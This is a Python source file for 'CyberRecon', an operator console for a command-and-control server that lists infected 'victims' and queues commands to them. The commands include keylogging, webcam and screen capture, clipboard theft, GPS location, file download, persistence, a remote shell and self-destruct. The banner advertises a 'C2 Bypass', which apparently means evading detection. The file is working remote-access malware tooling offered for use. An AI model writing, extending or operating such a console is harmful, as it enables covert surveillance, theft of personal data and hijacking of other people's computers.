"""
CyberRecon Operator CLI
Command-line interface for controlling victims via C2 server.
"""

import argparse
import json
import os
import sys
import requests


class OperatorCLI:
    COMMANDS = [
        "whoami", "screenshot", "webcam_snap", "keylog_start", "keylog_stop",
        "clipboard_get", "download", "gps_locate", "process_list",
        "system_info", "persist", "self_destruct", "shell", "list_files"
    ]

    def __init__(self, c2_url, token=None, ca_bundle=None):
        self.c2_url = c2_url.rstrip("/")
        self.session = requests.Session()
        if token:
            self.session.headers.update({"X-Operator-Token": token})
        # TLS verification — default to True (verify system CAs).
        # Set CYBERRECON_CA_BUNDLE to a PEM path for self-signed lab CA.
        self.session.verify = ca_bundle if ca_bundle else True
        self.current_victim = None

    def banner(self):
        print(r"""
   ____      _                  ____                      
  / ___|   _| |__   ___ _ __   |  _ \ ___  ___ ___  _ __  
 | |  | | | | '_ \ / _ \ '__|  | |_) / _ \/ __/ _ \| '_ \ 
 | |__| |_| | |_) |  __/ |     |  _ <  __/ (_| (_) | | | |
  \____\__, |_.__/ \___|_|     |_| \_\___|\___\___/|_| |_|
        |___/                                              

  Mandiant QR C2 Bypass - Operator Console
  """)

    def list_victims(self):
        try:
            resp = self.session.get(f"{self.c2_url}/victims")
            data = resp.json()
            print(f"\n{'='*60}")
            print(f"  Active Victims: {data['count']}")
            print(f"{'='*60}")
            for v in data["victims"]:
                status_color = "🟢" if v["status"] == "online" else "🔴"
                print(f"\n  {status_color} {v['id']} | {v['hostname']}")
                print(f"     IP: {v['ip']} | OS: {v['os']} | User: {v['user']}")
                print(f"     Pending: {v['pending_commands']} | Exfil: {v['exfil_count']}")
            print()
            return data["victims"]
        except Exception as e:
            print(f"[!] Error: {e}")
            return []

    def select_victim(self, victim_id):
        try:
            resp = self.session.get(f"{self.c2_url}/victim/{victim_id}")
            if resp.status_code == 200:
                self.current_victim = victim_id
                data = resp.json()
                print(f"[+] Selected victim: {data['hostname']} ({victim_id})")
                print(f"    OS: {data['os']} | User: {data['user']}")
                print(f"    Screenshots: {data['screenshots_count']} | Webcam: {data['webcam_count']}")
                print(f"    Keystrokes: {data['keystrokes_count']} | Locations: {data['locations_count']}")
                return True
            else:
                print(f"[!] Victim not found: {victim_id}")
                return False
        except Exception as e:
            print(f"[!] Error: {e}")
            return False

    def send_command(self, command, args=None):
        if not self.current_victim:
            print("[!] No victim selected. Use 'select <victim_id>' first.")
            return
        payload = {"command": command}
        if args:
            payload["args"] = args
        try:
            resp = self.session.post(
                f"{self.c2_url}/command/{self.current_victim}",
                json=payload
            )
            data = resp.json()
            if resp.status_code == 200:
                print(f"[+] Command queued: {command}")
                print(f"    Command ID: {data['command']['id']}")
                print(f"    Type: {data['command']['type']}")
            else:
                print(f"[!] Failed: {data.get('error', 'Unknown error')}")
        except Exception as e:
            print(f"[!] Error: {e}")

    def interactive(self):
        self.banner()
        while True:
            try:
                prompt = f"cyberrecon({self.current_victim or 'none'})> "
                cmd_line = input(prompt).strip()
                if not cmd_line:
                    continue
                parts = cmd_line.split()
                cmd = parts[0].lower()
                args = parts[1:]

                if cmd in ["exit", "quit"]:
                    print("[+] Exiting...")
                    break
                elif cmd == "help":
                    print("""
  Commands:
    victims              List all active victims
    select <id>          Select a victim
    <command>            Send C2 command to selected victim
    info                 Show selected victim info
    help                 Show this help
    exit                 Exit console

  Available C2 Commands:
    whoami, screenshot, webcam_snap, keylog_start, keylog_stop,
    clipboard_get, download <path>, gps_locate, process_list,
    system_info, persist, self_destruct
                    """)
                elif cmd == "victims":
                    self.list_victims()
                elif cmd == "select" and len(args) >= 1:
                    self.select_victim(args[0])
                elif cmd == "info":
                    if self.current_victim:
                        self.select_victim(self.current_victim)
                    else:
                        print("[!] No victim selected")
                elif cmd in self.COMMANDS:
                    self.send_command(cmd, args if args else None)
                else:
                    print(f"[!] Unknown command: {cmd}. Type 'help' for available commands.")
            except KeyboardInterrupt:
                print("\n[+] Exiting...")
                break
            except Exception as e:
                print(f"[!] Error: {e}")


def main():
    parser = argparse.ArgumentParser(description="CyberRecon Operator CLI")
    parser.add_argument("--c2", default="http://127.0.0.1:8443", help="C2 server URL")
    parser.add_argument(
        "--token",
        default=os.getenv("CYBERRECON_OPERATOR_TOKEN", ""),
        help="Operator API token (or set CYBERRECON_OPERATOR_TOKEN env var)",
    )
    parser.add_argument(
        "--ca-bundle",
        default=os.getenv("CYBERRECON_CA_BUNDLE", ""),
        help="Path to PEM CA bundle for TLS verification (default: system CAs)",
    )
    args = parser.parse_args()

    if not args.token:
        print("[!] WARNING: No operator token provided.")
        print("    Set --token <TOKEN> or CYBERRECON_OPERATOR_TOKEN env var.")
        print("    Protected endpoints will return 401.")
        print()

    if args.ca_bundle:
        if not os.path.isfile(args.ca_bundle):
            print(f"[!] ERROR: CA bundle not found: {args.ca_bundle}")
            sys.exit(1)
        print(f"[+] Using CA bundle: {args.ca_bundle}")
    else:
        print("[+] TLS verification: system CA store")

    cli = OperatorCLI(args.c2, args.token, args.ca_bundle or None)
    cli.interactive()


if __name__ == "__main__":
    main()
